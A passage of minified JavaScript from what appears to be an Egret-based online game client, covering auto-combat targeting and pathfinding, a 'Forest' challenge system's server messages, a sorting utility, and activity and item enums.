p=c.sent(),this.isAuto?(urlParam.debugTS&&console.log("-------结束autoAtkAndKill------"),e=!0,d=egret.getTimer()-t,urlParam.debugTS&&console.log("--oneRoundTime=",d),50>d?(console.error("一次循环时间太短,等待",50-d),[4,sheep(50-d)]):[3,12]):[3,13];case 11:c.sent(),c.label=12;case 12:return[3,1];case 13:return this.autoing=!1,[2]}})})},i.prototype.actSkillTime=function(){},i.prototype.autoAwaitUseSkill=function(){return __awaiter(this,void 0,void 0,function(){var t,e,i;return __generator(this,function(n){switch(n.label){case 0:t=a.SubRoles.lookAtTar,n.label=1;case 1:return this._isAutoUseSkill?(e=this.skill&&this.skill.canUse?this.skill:this.findSkill(1))?[3,3]:(console.log("----没有可以使用的技能3----"),[4,sheep(50)]):[2];case 2:return n.sent(),[3,1];case 3:return i=t,[4,this.pushCommand(y.atk,{tar:i,skill:e})];case 4:return n.sent(),this._isAutoUseSkill?[3,1]:[3,5];case 5:return[2]}})})},i.prototype.getDis=function(t,e){var i={x:t.gridX,y:t.gridY},n={x:e.gridX,y:e.gridY};if(e instanceof m.EntityData&&e.configID){var o=1,s=h.GlobalConfig.MonstersConfig[e.configID];s&&s.size>1&&(o=s.size),o>1&&(n.x=Math.abs(i.x-n.x)<Math.abs(i.x-(n.x+o-1))?n.x:n.x+o-1,n.y=Math.abs(i.y-n.y)<Math.abs(i.y-(n.y+o-1))?n.y:n.y+o-1)}return Math.max(Math.abs(i.x-n.x),Math.abs(i.y-n.y))},i.prototype.findSkill=function(t){var e=a.SubRoles.ins().roles[0];if(e&&e.skillsData){var i=e.job,n=e.skillsData,o=(t?h.GlobalConfig.SkillsLimitSorderConfig[i]:h.GlobalConfig.SkillsSorderConfig[i]).skillorder;for(var r in o)for(var p=o[r],d=0,c=n;d<c.length;d++){var f=c[d];if(f.id==p&&f.autoUse&&f.canUse){if(f.limit){var g=l.EntityManager.ins().findAll(a.SubRoles.lookAtTar,EntityType.Monster,u.TargetType.Enemy,!0,null,f.limit[0]).concat(l.EntityManager.ins().findAll(a.SubRoles.lookAtTar,EntityType.Role,u.TargetType.Enemy,!0,null,f.limit[0])).concat(l.EntityManager.ins().findAll(a.SubRoles.lookAtTar,EntityType.Pet,u.TargetType.Enemy,!0,null,f.limit[0]));
if(g.length<f.limit[1])continue}var m=a.SubRoles.lookAtTar?a.SubRoles.lookAtTar.data.getAtt(s.AttributeType.atMp):0;if(!(m<f.skillMP)){var v=h.GlobalConfig.SkillsConfig[f.configID],y=h.GlobalConfig.SkillsDescConfig[v.desc];if(1401==v.desc){for(var C=h.GlobalConfig.SkillsDescConfig[1401],T=(null===C||void 0===C?void 0:C.castRange)||1,g=l.EntityManager.ins().findAll(a.SubRoles.lookAtTar,EntityType.Monster,u.TargetType.Enemy,!0,null,T).concat(l.EntityManager.ins().findAll(a.SubRoles.lookAtTar,EntityType.Role,u.TargetType.Enemy,!0,null,T)).concat(l.EntityManager.ins().findAll(a.SubRoles.lookAtTar,EntityType.Pet,u.TargetType.Enemy,!0,null,T)),b=0,w=0,I=g;w<I.length;w++){var _=I[w];if(this.getDis(a.SubRoles.lookAtTar.data,_.data)<=T&&b++,y&&y&&b>=(y.castLimitCnt||1))break}if(y&&y&&b<(y.castLimitCnt||1))continue}return f}}}return null}},i.prototype.needFindAgainTarget=function(t,e){if(!e)return!0;if(t==u.TargetType.Enemy&&l.EntityManager.ins().checkIsInKillMeList(e.infoModel.handle))return!1;switch(t){case u.TargetType.My:return e!=a.SubRoles.lookAtTar;case u.TargetType.Friendly:if(e.data.isFriend())return!1;switch(d.CampCC.mode){case d.CampMode.ALL:return!0;case d.CampMode.GUILD:return e.infoModel.type==EntityType.Role&&e.infoModel.guildID>0&&e.infoModel.guildID==a.SubRoles.lookAtTar.infoModel.guildID?!1:!0;case d.CampMode.TEAM:return f.CityCC.ins().isMyTeamNumber(e.infoModel?e.infoModel.teamId:0)?!1:!0;default:return e.infoModel.type==EntityType.Role?!1:!0}default:if(e.data.isFriend())return!0;switch(d.CampCC.mode){case d.CampMode.ALL:return!1;case d.CampMode.GUILD:return e.infoModel.type==EntityType.Role&&e.infoModel.guildID>0&&e.infoModel.guildID==a.SubRoles.lookAtTar.infoModel.guildID?!0:!1;case d.CampMode.TEAM:return f.CityCC.ins().isMyTeamNumber(e.infoModel?e.infoModel.teamId:0)?!0:!1;default:return e.infoModel.type==EntityType.Role?!0:!1}}},i.prototype.exeCommand=function(){return __awaiter(this,void 0,void 0,function(){var t;return __generator(this,function(e){switch(e.label){case 0:if(this.isExe)return[2];this.isExe=!0,e.label=1;case 1:return this.commands.length?(t=this.commands[0],this.commands.shift(),[4,t()]):[3,3];case 2:return e.sent(),[3,1];case 3:return this.curXY=null,this.isExe=!1,[2]}})})},i.prototype.pushCommand=function(t,e){var i=this;return new Promise(function(n){var s=a.SubRoles.lookAtTar;if(!s.isDie()){if(t==y.move){var r=Ts.roleStatus.canMove,l=s.isDie();if(!r||l)return void g.GameLogic.ins().find3v3Question("点击地板请求移动222222-后端不让移动或者角色死了 + "+r+"-"+l);var h=e;urlParam.debugTS&&console.error("--pushCommand,move");var u=function(){return __awaiter(i,void 0,void 0,function(){var t,e=this;return __generator(this,function(i){switch(i.label){case 0:return h.checkFun.stop||(h.checkFun.stop=function(){return e.commands[0]}),urlParam.debugTS&&console.error("--执行pushCommand,moveTo"),g.GameLogic.ins().find3v3Question("点击地板请求移动333333-执行移动函数"),[4,this.moveTo(h,h.checkFun)];case 1:return t=i.sent(),null===t?[2]:(n(),[2])}})})};i.commands[0]=u}else{var p=e,d=p.tar,f=p.skill,u=function(){return __awaiter(i,void 0,void 0,function(){var t,e,i,r,l,h,u,p,g,m,v,y,C=this;return __generator(this,function(T){switch(T.label){case 0:return d?(t=function(t,e){return e&&t?C.getDis(e,t)<=f.castRange:!0},t.stop=function(){return d.isDie()?!0:C.commands[0]},urlParam.debugTS&&console.log("--执行pushCommand,atk的moveTo"),[4,this.moveTo(d.data,t,a.SubRoles.lookAtTar,!1,null,d,f.castRange)]):[3,2];case 1:if(e=T.sent(),urlParam.debugTS&&console.log("--执行pushCommand,atk的moveTo,result=",e),null==e)return d.isDie()&&this.isAuto&&n(),[2];if(!t(d.data,s.data))return urlParam.debugTS&&console.log("@@目标点不可能到达"),this.setCurTar(null),this.lastEnemy==d.data.handle&&(this.lastEnemy=0),n(),[2];T.label=2;case 2:return(null===(m=null===s||void 0===s?void 0:s.infoModel)||void 0===m?void 0:m.handle)?[3,4]:[4,sheep(50)];case 3:return T.sent(),n(),[2];case 4:return d?i=d.data:(r=o.DirUtil.getGridByDir(o.DirUtil.dirOpposit(s.dir),1,{x:c.mainfightcc.gridToX(s.data.gridX),y:c.mainfightcc.gridToY(s.data.gridY)}),i={gridX:c.mainfightcc.xToGrid(r.x),gridY:c.mainfightcc.yToGrid(r.y)}),d&&d.isDie()?(this.setCurTar(null),n(),[2]):(l=egret.getTimer(),this._preSendUseSkillTime=l,[4,sendSync(Ts.useSkill,{handle:s.infoModel.handle,tarHandle:(null===(v=null===d||void 0===d?void 0:d.infoModel)||void 0===v?void 0:v.handle)||0,skillID:f.config.id,x:i.gridX,y:i.gridY},function(t){var e,i=t.handle;return i==(null===(e=null===s||void 0===s?void 0:s.infoModel)||void 0===e?void 0:e.handle)})]);case 5:return(h=T.sent().error)?(urlParam.debugTS&&console.log("@@使用技能失败=",h),u=h.split("_"),u.length>2?(p=Number(u[1]),g=Number(u[2]),1!=p?[3,7]:[4,sheep(g)]):[3,8]):[3,9];case 6:return T.sent(),[3,8];case 7:2==p&&f.setMsUse(g),T.label=8;case 8:return n(),[2];case 9:return urlParam.debugTS&&console.log("@@使用技能成功,id=",f.config.id,f.name,null===(y=null===d||void 0===d?void 0:d.infoModel)||void 0===y?void 0:y.name),this.lastUseTime=l,this.skill==f&&(this.skill=null),f.updateCD(l),n(),[2]}})})};i.commands[0]=u}i.exeCommand()}})},i.prototype.checkIsBlock=function(){this.isAuto&&this._preSendUseSkillTime>0&&egret.getTimer()-this._preSendUseSkillTime>5e3&&(this.autoing=!1,this.autoAtkAndKill())},i.prototype.getAreaGirdArr=function(t,e,i){void 0===i&&(i=1);var n=Math.sqrt(i);e=e?e:1,e=Math.floor(e);for(var o=Math.max(1,e),s=Math.max(t.gridX-o,0),a=Math.max(t.gridY-o,0),r=Math.min(t.gridX+n+o-1,c.mainfightcc.wNum),l=Math.min(t.gridY+n+o-1,c.mainfightcc.hNum),h=[],u=s;r>=u;u++){var p={gridX:u,gridY:a};this.checkRepeat(h,p)||h.push({gird:p,isFind:!1,pixelPos:c.mainfightcc.gridToPox({x:p.gridX,y:p.gridY})});var d={gridX:u,gridY:l};this.checkRepeat(h,d)||h.push({gird:d,isFind:!1,pixelPos:c.mainfightcc.gridToPox({x:d.gridX,y:d.gridY})})}for(var u=a;l>=u;u++){var p={gridX:s,gridY:u};this.checkRepeat(h,p)||h.push({gird:p,isFind:!1,pixelPos:c.mainfightcc.gridToPox({x:p.gridX,y:p.gridY})});var d={gridX:r,gridY:u};this.checkRepeat(h,d)||h.push({gird:d,isFind:!1,pixelPos:c.mainfightcc.gridToPox({x:d.gridX,y:d.gridY})})}return h},i.prototype.checkRepeat=function(t,e){if(0==t.length)return!1;for(var i=0,n=t;i<n.length;i++){var o=n[i];if(o.gird.gridX==e.gridX&&o.gird.gridY==e.gridY)return!0}return!1},i.prototype.getMinDisMeGrid=function(t,e){if(!t||0==t.length)return null;for(var i=1e7,n=null,o=c.mainfightcc.gridToPox({x:e.gridX,y:e.gridY}),s=0,a=t;s<a.length;s++){var r=a[s];if(!r.isFind){var l=Math.sqrt(Math.pow(o.x-r.pixelPos.x,2)+Math.pow(o.y-r.pixelPos.y,2));i>l&&(i=l,n=r)}}return n},i.prototype.getOneStep=function(t,e,i,n){var o,s,r;if(void 0===e&&(e=a.SubRoles.lookAtTar),!e.data)return null;var l=t.gridX,u=t.gridY,p=e.data.gridX,d=e.data.gridY;if(i&&i.infoModel&&(null===(o=i.infoModel)||void 0===o?void 0:o.configID)){var f=(null===(s=h.GlobalConfig.MonstersConfig[i.infoModel.configID])||void 0===s?void 0:s.size)||0;f>1&&(l=Math.abs(p-l)<Math.abs(p-(l+1))?l:l+1,u=Math.abs(d-u)<Math.abs(d-(u+1))?u:u+1)}if(i&&i.infoModel){var f=(null===(r=h.GlobalConfig.MonstersConfig[i.infoModel.configID])||void 0===r?void 0:r.size)||1,g=this.getAreaGirdArr(t,n,f),m=g.length,v=(g.concat([]),this.getMinDisMeGrid(g,{gridX:p,gridY:d}));v&&(l=v.gird.gridX,u=v.gird.gridY,v.isFind=!0);for(var y=c.MainFightCC.getPath(p,d,l,u,i),C=0;!y&&m>C;)v=this.getMinDisMeGrid(g,{gridX:p,gridY:d}),v&&(l=v.gird.gridX,u=v.gird.gridY,v.isFind=!0),urlParam.debugTS&&console.log("pGridX pGridY,",l,u),y=c.MainFightCC.getPath(p,d,l,u,i),C++;if(y&&y.length>0){var T=y.pop();return{gridX:T.nX,gridY:T.nY}}return null}var b=c.MainFightCC.getPath(p,d,l,u,i);if(b&&b.length>0){var T=b.pop();return{gridX:T.nX,gridY:T.nY}}return null},i.prototype.hasEntityByPos=function(t,e){var i=l.EntityManager.ins().getAllEntity();for(var n in i){var o=i[n],s=1,a=h.GlobalConfig.MonstersConfig[o.data.configID];a&&a.size>1&&(s=a.size);for(var r=0;s>r;r++)for(var u=0;s>u;u++)if(o.data.gridX+r==t&&o.data.gridY+u==e)return o}return null},i.prototype.getMoveToFun=function(t,e,i,n,o){var s=this;void 0===e&&(e=a.SubRoles.lookAtTar),void 0===i&&(i=!1);var l=this.getOneStep(t,e,n,o),h=[];if(urlParam.debugTS&&(l?console.log("@@path=",l.gridX,l.gridY):console.log("@@寻路失败")),g.GameLogic.ins().find3v3Question("path is null"),l){if(e.isDie())return[];var u=function(){return __awaiter(s,void 0,void 0,function(){var t,i;return __generator(this,function(n){switch(n.label){case 0:return[4,Ts.roleStatus.awaitCanMove()];case 1:return n.sent(),e.playAction(r.EntityAction.RUN),this.startMoveTime=egret.getTimer(),t=this.getMoveCd(),0==t&&(console.error("时间=0!!!!",e.infoModel),t=400),[4,sheep(t)];case 2:return n.sent(),i=this,this.resolveMove&&(g.GameLogic.ins().find3v3Question("点击地板请求移动888888-上一次移动还没结束"),console.error("@@上一次移动还没结束!!!!"),this.resolveMove(0),this.resolveMove=null),[4,new Promise(function(t){i.resolveMove=t,urlParam.debugTS&&console.log("@@挂起resolve...."),g.GameLogic.ins().find3v3Question("点击地板请求移动999999-请求移动"),i.sendMove(e,{x:l.gridX,y:l.gridY})})];case 3:return n.sent(),urlParam.debugTS&&console.log("@@本次移动花费=",egret.getTimer()-this.startMoveTime),[2]}})})};h.push(u)}return h},i.prototype.getMoveCd=function(){var t=a.SubRoles.lookAtTar.data.getAtt(s.AttributeType.atMoveSpeed),e=0,i=5e4/(t*(1+e/1e4));return i},i.prototype.moveTo=function(t,e,i,n,o,s,r){var l=this;return void 0===i&&(i=a.SubRoles.lookAtTar),void 0===n&&(n=!1),new Promise(function(a){return __awaiter(l,void 0,void 0,function(){var l,h,u,p,d,c,f,m,v;return __generator(this,function(y){switch(y.label){case 0:this.resolveMove&&console.error("@@上一次移动还没结束!!!!"),l=0,h=0,y.label=1;case 1:if(e(t,i.data))return[3,6];if(0==l&&(l=1,g.GameLogic.ins().find3v3Question("点击地板请求移动444444-开始移动moveTo"),urlParam.debugTS&&console.error("----开始moveTo,p=",t.gridX,t.gridY," cur=",i.data.gridX,i.data.gridY)),h=1,h>0&&(u=this.getMoveCd()),e(t,i.data))return g.GameLogic.ins().find3v3Question("点击地板请求移动555555-停止移动"),[3,6];g.GameLogic.ins().find3v3Question("点击地板请求移动666666-执行 getMoveToFun"),p=this.getMoveToFun(t,i,n,s,r),d=0,y.label=2;case 2:return d<p.length?(c=p[d],[4,c()]):[3,5];case 3:if(y.sent(),e(t,i.data))return console.log("--checkFun通过"),[3,5];if(e.stop&&e.stop())return a(null),console.log("----结束moveTo,resolve(null)"),[2];if(o&&(console.error("@@不应该走这里stopFun"),f=o(),m=f[0],v=f[1],!m))return v?[3,5]:(a(null),[2]);y.label=4;case 4:return d++,[3,2];case 5:return h++,p&&p.length?[3,1]:[3,6];case 6:return 1==l&&(urlParam.debugTS&&console.log("----结束moveTo----"),console.log("------结束moveto------")),a(1),[2]}})})})},__decorate([post()],i.prototype,"setAuto",null),__decorate([post()],i.prototype,"setCurTar",null),i}(n.CC);window.controlcc=v,__reflect(v.prototype,"controlcc",[]);var y;!function(t){t[t.move=0]="move",t[t.pick=1]="pick",t[t.atk=2]="atk",t[t.max=3]="max"}(y=e.CommandEnum||(e.CommandEnum={})),window.CommandEnum=y,e.ControlCC=new v,window.ControlCC=e.ControlCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Fb2CT=void 0;var n=i(14),o=i(17),s=i(0),a=i(2),r=i(87),l=i(92),h=function(t){function e(){var e=t.call(this)||this;return e.fb2Rp=new o.RedPoint,e.sysId=PackageID.FbChallenge,e.regNetMsg(1,e.postUpDataInfo),e.regNetMsg(2,e.postRewardStatu),e.regNetMsg(4,e.postGetReward),e.regNetMsg(5,e.postLotteryReward),e.regNetMsg(7,e.postForestInfo),e.regNetMsg(8,e.postForestMapInfo),e.regNetMsg(9,e.postForestMapLv),e.regNetMsg(12,e.postForestBuff),e.regNetMsg(14,e.postForestUseGoods),e.regNetMsg(15,e.postForestBuyData),e.initRp(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRp=function(){this.fb2Rp=new o.RedPoint(function(){l.SkyLevelModel.ins().dayReward;return 1==l.SkyLevelModel.ins().dayReward},this.postGetReward,this.postUpDataInfo)},e.prototype.sendChallenge=function(){this.sendBaseProto(1)},e.prototype.sendrequestDayReward=function(){this.sendBaseProto(2)},e.prototype.postUpDataInfo=function(t){l.SkyLevelModel.ins().setCruLevelInfo(t.readInt()),l.SkyLevelModel.ins().dayReward=t.readShort(),l.SkyLevelModel.ins().lotteryIndexs=t.readInt(),l.SkyLevelModel.ins().lotteryUseTimes=t.readInt()},e.prototype.postRewardStatu=function(t){var e=t.readShort();l.SkyLevelModel.ins().dayRewardList=[];for(var i=0;e>i;i++){var n=t.readInt(),o=t.readInt(),s=t.readInt();l.SkyLevelModel.ins().dayRewardList[i]=[n,o,s]}l.SkyLevelModel.ins().rewardTimes=Math.ceil((e-12)/12)},e.prototype.sendGetDayReward=function(){this.sendBaseProto(4)},e.prototype.sendBeginLottery=function(){this.sendBaseProto(5)},e.prototype.sendGetReward=function(){this.sendBaseProto(6)},e.prototype.sendForestInfo=function(){var t=this.getBytes(7);this.sendToServer(t)},e.prototype.sendForestMapInfo=function(){var t=this.getBytes(8);this.sendToServer(t)},e.prototype.sendForestMapStarLv=function(){var t=this.getBytes(9);this.sendToServer(t)},e.prototype.sendForestEvent=function(t){var e=this.getBytes(10);e.writeShort(t),this.sendToServer(e)},e.prototype.sendForestNext=function(t){var e=this.getBytes(11);e.writeByte(t),this.sendToServer(e)},e.prototype.sendForestBuff=function(){var t=this.getBytes(12);this.sendToServer(t)},e.prototype.sendForestPoint=function(t){var e=this.getBytes(13);e.writeByte(t),this.sendToServer(e)},e.prototype.sendForestUseGoods=function(t){var e=this.getBytes(14);e.writeInt(t),this.sendToServer(e)},e.prototype.sendForestBuyData=function(){var t=this.getBytes(15);this.sendToServer(t)},e.prototype.postLotteryReward=function(t){l.SkyLevelModel.ins().lotteryUseTimes=t.readInt(),l.SkyLevelModel.ins().lotteryAwardIndex=t.readInt()},e.prototype.postGetReward=function(t){l.SkyLevelModel.ins().dayReward=2},e.prototype.postForestInfo=function(t){var e=t.readUnsignedShort(),i=t.readByte(),n=t.readByte(),o=Math.floor(e/1e3),s=t.readDouble(),a=t.readShort();e%=1e3;var l=t.readUnsignedInt();r.ForestModel.ins().hardStateTime=l;var h=r.ForestModel.ins().forestState;h!=i&&1==i&&this.moveComplete(),0==h&&2==i&&(win.open("ForestBattleResultWin",1),win.open("ForestWin",1)),0==h&&-1==i&&(win.open("ForestBattleResultWin",0),win.open("ForestWin")),r.ForestModel.ins().forestLv=o,r.ForestModel.ins().forestLocation=e,r.ForestModel.ins().forestState=i,r.ForestModel.ins().forestResetCount=n,r.ForestModel.ins().pow=s,r.ForestModel.ins().forestFullStarCount=a},e.prototype.moveComplete=function(){},e.prototype.postForestMapInfo=function(t){var e=t.readShort();r.ForestModel.ins().mapInofList=[];for(var i=r.ForestModel.ins().mapInofList,n=0;e>n;n++){var o=new r.ForestMapInfoVo;o.layer=t.readUnsignedByte(),o.location=t.readUnsignedByte(),o.eventId=t.readInt(),o.linePoint1=t.readUnsignedByte(),o.linePoint2=t.readUnsignedByte();var a=s.GlobalConfig.YoumingForestEventConfig[o.eventId],l=s.GlobalConfig.YoumingForestRewardEventConfig[o.eventId];switch(a.type){case 1:case 3:if(1==l.type)for(var h=t.readShort(),u=0;h>u;u++){var p=t.readUnsignedByte();o.eventList.push(p)}break;case 2:case 4:case 5:case 6:for(var d=t.readShort(),c=0;d>c;c++){var f=t.readUnsignedByte();o.eventList.push(f)}}for(var g=!1,u=0;u<i.length;u++)if(i[u].location==o.location){i[u]=o,g=!0;break}g||i.push(o)}},e.prototype.postForestMapLv=function(t){var e=t.readShort();0==e&&(r.ForestModel.ins().mapStarList=[]);for(var i=r.ForestModel.ins().mapStarList,n=0;e>n;n++){var o=new r.ForestMapStarVo;o.location=t.readUnsignedByte(),o.star=t.readByte(),i[o.location]=o}},e.prototype.postForestBuff=function(t){for(var e=t.readShort(),i=r.ForestModel.ins().buffList,n=0;e>n;n++){var o=t.readInt();i.push(o)}},e.prototype.postForestUseGoods=function(t){a.TipsCT.ins().showTips(gettext("使用成功"))},e.prototype.postForestBuyData=function(t){var e=r.ForestModel.ins().mapBuyList,i=t.readShort();if(0==i)return r.ForestModel.ins().mapBuyList=[],void(e=r.ForestModel.ins().mapBuyList);if(1==i){var n=t.readByte(),o=new r.ForestBuyVo;return o.location=n,o.buy=t.readByte(),void e.push(o)}if(i>1){r.ForestModel.ins().mapBuyList=[],e=r.ForestModel.ins().mapBuyList;for(var s=0;i>s;s++){var o=new r.ForestBuyVo;o.location=t.readByte(),o.buy=t.readByte(),e.push(o)}}},__decorate([post()],e.prototype,"postUpDataInfo",null),__decorate([post()],e.prototype,"postRewardStatu",null),__decorate([post()],e.prototype,"postLotteryReward",null),__decorate([post()],e.prototype,"postGetReward",null),__decorate([post()],e.prototype,"postForestInfo",null),__decorate([post()],e.prototype,"moveComplete",null),__decorate([post()],e.prototype,"postForestMapInfo",null),__decorate([post()],e.prototype,"postForestMapLv",null),__decorate([post()],e.prototype,"postForestBuff",null),__decorate([post()],e.prototype,"postForestUseGoods",null),__decorate([post()],e.prototype,"postForestBuyData",null),e}(n.BaseSystem);e.Fb2CT=h,window.Fb2CT=h,__reflect(h.prototype,"Fb2CT",[]),Systemap.Fb2CT=function(){return h.ins()},window.Fb2CT=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Algorithm=void 0;var n=function(){function t(){}return t.sortAsc=function(t,e){return e>t?-1:t>e?1:0},t.sortDesc=function(t,e){return t>e?-1:e>t?1:0},t.sortAscAttr=function(e,i,n){var o;if(void 0==n)o=t.sortAsc(e,i);else{var s=e[n],a=i[n];o=a>s?-1:s>a?1:0}return o},t.sortDescAttr=function(e,i,n){var o;if(void 0==n)o=t.sortDesc(e,i);else{var s=e[n],a=i[n];o=s>a?-1:a>s?1:0}return o},t.binSearch=function(e,i,n){if(void 0===n&&(n=null),!e||0==e.length)return 0;n||(n=t.sortAsc);for(var o=0,s=e.length-1;s>=o;){var a=s+o>>1,r=e[a];n(r,i)<=0?o=a+1:s=a-1}return o},t.test=function(){for(var e=[],i=10,n=0;i>n;n++){var o=Math.floor(1e5*Math.random()),s=t.binSearch(e,o);e.splice(s,0,o)}e.length!=i&&console.log("test fail!count is "+e.length+", except:"+i);for(var a=0,r=e;a<r.length;a++){var l=r[a];console.log(l)}for(var n=0;n<e.length-1;n++)if(e[n]>e[n+1]){console.log("test fail!index:"+n);break}},t}();e.Algorithm=n,window.Algorithm=n,__reflect(n.prototype,"Algorithm",[]),window.Algorithm=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Activity1004PageStyle=e.Activity1003PageStyle=e.Activity1002PageStyle=e.Activity1001PageStyle=e.Activity6PageStyle=e.Activity5PageStyle=e.Activity4PageStyle=e.Activity3PageStyle=e.ActivityPageStyle=e.ActivityDataFactory=e.ActSubType=e.ActivityDataType=void 0;var n,o=i(33),s=i(0),a=i(8),r=i(7),l=i(280),h=i(9);!function(t){t[t._0=0]="_0",t[t._1=1]="_1",t[t._2=2]="_2",t[t._3=3]="_3",t[t._4=4]="_4",t[t._5=5]="_5",t[t._6=6]="_6",t[t._7=7]="_7",t[t._8=8]="_8",t[t._9=9]="_9",t[t._10=10]="_10",t[t._11=11]="_11",t[t._12=12]="_12",t[t._13=13]="_13",t[t._14=14]="_14",t[t._15=15]="_15",t[t._16=16]="_16",t[t._17=17]="_17",t[t._18=18]="_18",t[t._19=19]="_19",t[t._20=20]="_20",t[t._21=21]="_21",t[t._22=22]="_22",t[t._23=23]="_23",t[t._24=24]="_24",t[t._25=25]="_25",t[t._26=26]="_26",t[t._27=27]="_27",t[t._28=28]="_28",t[t._29=29]="_29",t[t._30=30]="_30",t[t._31=31]="_31",t[t._32=32]="_32",t[t._33=33]="_33",t[t._34=34]="_34",t[t._35=35]="_35",t[t._36=36]="_36",t[t._37=37]="_37",t[t._38=38]="_38",t[t._39=39]="_39",t[t._40=40]="_40",t[t._41=41]="_41",t[t._42=42]="_42",t[t._43=43]="_43",t[t._44=44]="_44",t[t._45=45]="_45",t[t._46=46]="_46",t[t._47=47]="_47",t[t._48=48]="_48",t[t._49=49]="_49",t[t._50=50]="_50",t[t._51=51]="_51",t[t._52=52]="_52",t[t._53=53]="_53",t[t._54=54]="_54",t[t._55=55]="_55",t[t._56=56]="_56",t[t._57=57]="_57",t[t._58=58]="_58",t[t._59=59]="_59",t[t._60=60]="_60",t[t._61=61]="_61",t[t._62=62]="_62"}(n=e.ActivityDataType||(e.ActivityDataType={})),window.ActivityDataType=n,window.ActivityDataType=n;var u;!function(t){t[t.TYPE_1=1]="TYPE_1",t[t.TYPE_2=2]="TYPE_2",t[t.TYPE_3=3]="TYPE_3",t[t.TYPE_4=4]="TYPE_4",t[t.TYPE_5=5]="TYPE_5",t[t.TYPE_6=6]="TYPE_6",t[t.TYPE_7=7]="TYPE_7"}(u=e.ActSubType||(e.ActSubType={})),window.ActSubType=u,window.ActSubType=u;var p=function(){function t(){}return t.create=function(t){var e,i=t.readInt(),n=t.readInt(),a=t.readInt(),r=t.readShort();t.readInt();try{e=ObjectPool.pop("ActivityType"+r+"Data",t,i)}catch(l){console.error("ActivityType"+r+"Data 不存在")}if(!e)return null;if(e.id=i,e.startTime=n,e.endTime=a,e.type=r,e.activityType=o.ActivityType.Normal,s.GlobalConfig.ActivityConfig){var h=s.GlobalConfig.ActivityConfig[i];return h&&(e.timeType=h.timeType,e.pageStyle=h.pageStyle,e.pageSkin=h.pageSkin),e}},t.createEx=function(){var e,i=s.GlobalConfig.ActivityBtnConfig,n=a.DateUtils.formatMiniDateTime(r.GameServerCC._serverZeroTime);a.DateUtils.formatMiniDateTime(r.GameServerCC._serverHeZeroTime);for(var u in i){var p=i[u],d=p.hfTimes||0,c=p.timeType?p.timeType:0;if(!(c&&c==t.TimeType_Total&&d&&d!=r.GameServerCC._hefuCount||p.type)){if(e=new l.ActivityType0Data(null),e.id=p.id,e.type=p.type,e.activityType=o.ActivityType.Normal,e.timeType=p.timeType,p.pageStyle&&(e.pageStyle=p.pageStyle),p.relyOn){e.relyOn=p.relyOn;for(var f=0;f<p.relyOn.length;f++)if(h.Activity.ins().activityData[p.relyOn[f]]){e.startTime=a.DateUtils.formatMiniDateTime(h.Activity.ins().activityData[p.relyOn[f]].startTime),e.endTime=a.DateUtils.formatMiniDateTime(h.Activity.ins().activityData[p.relyOn[f]].endTime);break}}else if(p.timeType==t.TimeType_Normal){var g=p.startTime.split("-"),m=+g[0],v=g[1].split(":"),y=new Date(n);if(y.setDate(y.getDate()+m),y.setHours(+v[0],+v[1],0,0),e.startTime=y.getTime(),p.endTime){g=p.endTime.split("-");var C=+g[0],T=g[1].split(":"),b=new Date(n);b.setDate(b.getDate()+C),b.setHours(+T[0],+T[1],0,0),e.endTime=b.getTime()}else e.endTime=r.GameServerCC.serverTime+2592e6}else if(p.timeType==t.TimeType_Fixed)e.startTime=new Date(p.startTime).getTime(),e.endTime=new Date(p.endTime).getTime();else if(p.timeType==t.TimeType_Total){var g=[],C=a.DateUtils.DAYS_PER_WEEK;p.endTime&&(g=p.endTime.split("-"),C=+g[0])}else e.startTime=n,e.endTime=r.GameServerCC.serverTime+2592e6;var w=Math.floor((e.endTime-r.GameServerCC.serverTime)/1e3);w>0&&(h.Activity.ins().activityData[p.id]=e)}}},t.TimeType_Normal=0,t.TimeType_Fixed=1,t.TimeType_Total=2,t}();e.ActivityDataFactory=p,window.ActivityDataFactory=p,__reflect(p.prototype,"ActivityDataFactory",[]),window.ActivityDataFactory=p;var d;!function(t){t[t.HAPPYSEVENDAY=1]="HAPPYSEVENDAY",t[t.Activity10=10]="Activity10",t[t.SPRINGEIGHTDAY=13]="SPRINGEIGHTDAY",t[t.VERSIONCELE=17]="VERSIONCELE",t[t.Activity41=41]="Activity41"}(d=e.ActivityPageStyle||(e.ActivityPageStyle={})),window.ActivityPageStyle=d;var c;!function(t){t[t.Activity2=2]="Activity2"}(c=e.Activity3PageStyle||(e.Activity3PageStyle={})),window.Activity3PageStyle=c;var f;!function(t){t[t.Activity4=4]="Activity4"}(f=e.Activity4PageStyle||(e.Activity4PageStyle={})),window.Activity4PageStyle=f;var g;!function(t){t[t.Activity5=5]="Activity5"}(g=e.Activity5PageStyle||(e.Activity5PageStyle={})),window.Activity5PageStyle=g;var m;!function(t){t[t.Activity6=6]="Activity6"}(m=e.Activity6PageStyle||(e.Activity6PageStyle={})),window.Activity6PageStyle=m;var v;!function(t){t[t.Activity1001=1001]="Activity1001"}(v=e.Activity1001PageStyle||(e.Activity1001PageStyle={})),window.Activity1001PageStyle=v;var y;!function(t){t[t.Activity1002=1002]="Activity1002"}(y=e.Activity1002PageStyle||(e.Activity1002PageStyle={})),window.Activity1002PageStyle=y;var C;!function(t){t[t.Activity1003=1003]="Activity1003"}(C=e.Activity1003PageStyle||(e.Activity1003PageStyle={})),window.Activity1003PageStyle=C;var T;!function(t){t[t.Activity1004=1004]="Activity1004"}(T=e.Activity1004PageStyle||(e.Activity1004PageStyle={})),window.Activity1004PageStyle=T,window.ActivityPageStyle=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GEM_STATUS=e.STORE_SUB_TYPE=e.PANEL_TYPE=e.SettingBagType=e.QualityType=e.BagCBConfirmResult=e.EntityOrder=e.ActOnPlace=e.ItemUseType=void 0;var n;!function(t){t[t.None=0]="None"}(n=e.ItemUseType||(e.ItemUseType={})),window.ItemUseType=n,window.ItemUseType=n;var o;!function(t){t[t.HuoDong=1]="HuoDong",t[t.HeFu=3]="HeFu"}(o=e.ActOnPlace||(e.ActOnPlace={})),window.ActOnPlace=o,window.ActOnPlace=o;var s;!function(t){t[t.None=0]="None",t[t.RoleOrder=1]="RoleOrder",t[t.BossOrder=2]="BossOrder"}(s=e.EntityOrder||(e.EntityOrder={})),window.EntityOrder=s,window.EntityOrder=s;var 